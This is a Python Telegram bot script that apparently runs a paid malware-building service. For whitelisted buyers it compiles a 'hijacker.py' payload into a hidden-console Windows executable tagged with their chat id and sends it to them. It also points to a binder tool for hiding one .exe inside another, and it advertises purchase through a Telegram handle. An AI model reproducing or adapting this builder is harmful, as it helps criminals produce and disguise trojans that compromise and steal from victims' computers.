import json
import os
import shutil
import telebot
from telebot import types
import PyInstaller.__main__


bot = telebot.TeleBot("TELEGRAM_BOT_TOKEN", parse_mode="html")
admin = -1001797987215 #admin chat id


@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    itembtn1 = types.KeyboardButton('make .exe')
    itembtn2 = types.KeyboardButton('bind .exe to .exe')
    markup.add(itembtn1, itembtn2)
    bot.reply_to(message, "Howdy, how are you doing?\nTo buy, refer to this ID: @fploit", reply_markup=markup)


@bot.message_handler(func=lambda m: True)
def echo_all(message):
    if "adduser" in message.text:
        if message.chat.id == admin:
            new_id = message.text.split(" ")[1]
            old_data = json.loads(open("./data.json", "r").read())
            if not new_id in old_data["users_list"]:
                old_data["users_list"].append(new_id)
                new_data = open("./data.json", "w")
                new_data.write(json.dumps(old_data))
                new_data.close()
                bot.reply_to(message, "user added")
            else:
                bot.reply_to(message, "this user in list")

    data = json.loads(open("./data.json", "r").read())
    if str(message.chat.id) in data["users_list"]:
        if message.text == "make .exe":
            if not open("./run", "r").read() == "run":
                bot.reply_to(message, "wait...")
                f = open("./run", "w")
                f.write("run")
                f.close()
                os.makedirs(f'./{message.chat.id}')
                shutil.copyfile("./hijacker.py", f'./{message.chat.id}/hijacker.py')
                ffo = open(f'./{message.chat.id}/hijacker.py', 'r').read().replace("CHATX_IDX_X", str(message.chat.id))
                ff = open(f'./{message.chat.id}/hijacker.py', 'w')
                ff.write(ffo)
                ff.close()
                PyInstaller.__main__.run([
                    f'./{message.chat.id}/hijacker.py',
                    '--onefile',
                    '--noconsole'
                ])
                bot.send_document(chat_id=message.chat.id, document=open('./dist/hijacker.exe', 'rb'))
                shutil.rmtree(f'./{message.chat.id}', ignore_errors=True)
                shutil.rmtree('./build', ignore_errors=True)
                shutil.rmtree('./dist', ignore_errors=True)
                os.remove(f'./hijacker.spec')
                open("./run", "w").close()
            else:
                bot.reply_to(message, "چند لحظه بعد امتحان کنید، سیستم مشغول است")
        
        elif message.text == "bind .exe to .exe":
            bot.reply_to(message, "https://github.com/cymilad/Celesty_Binder")




bot.infinity_polling()